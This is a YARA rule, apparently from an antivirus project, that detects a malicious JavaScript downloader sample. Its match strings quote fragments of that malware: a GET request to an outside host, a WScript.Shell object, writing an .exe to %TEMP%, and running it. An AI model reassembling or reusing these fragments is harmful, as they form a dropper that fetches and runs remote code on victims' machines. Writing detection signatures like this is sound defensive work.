rule sig_20160330_87fd4ae1cad2aadb77e9ff9c5c8b0e50 {
  meta:
    description = "datamaliciousorder - file 20160330_87fd4ae1cad2aadb77e9ff9c5c8b0e50.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "afa5babb2eb52054e79de96c001e5def77c53485fdbe0b1376604febc8872914"

  strings:
    $s1  = "function B(Q, IY){L0 = L0 * 1; return Q - IY;};" fullword ascii
    $s2  = "T0[DJ](\"GET\", \"http://vtdrive.kz/f6dh1a\", false);" fullword ascii
    $s3  = "var E = function C() {return WScript[K](\"WScript\"+\".Shell\");}(), C0 = 11;" fullword ascii
    $s4  = "if (T0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function JP() {return E[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"EIlV1Pvb2.ex\" + \"e\";};" fullword ascii
    $s6  = "function LN(){return VY0 + \"\";};" fullword ascii
    $s7  = "function H() {return ((L2 == true) && (L2 == X)) ? 1 : L0;};" fullword ascii
    $s8  = "function RL(Z){E[\"Run\"](Z, L0, L0);};" fullword ascii
    $s9  = "function I(){return 22;};" fullword ascii
    $s10 = "function T(){return K;};" fullword ascii
    $s11 = "function US(V) {var U = (1, 2, 3, 4, 5, V); return U;};" fullword ascii
    $s12 = "return B(NL, F);" fullword ascii
    $s13 = "}while (PA);" fullword ascii
    $s14 = "function VY()" fullword ascii
    $s15 = "var AG = new this[\"Date\"]();" fullword ascii
    $s16 = "L2 = true; " fullword ascii
    $s17 = "var L2 = false;" fullword ascii
    $s18 = "var YJ = false;" fullword ascii
    $s19 = "} catch(A){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}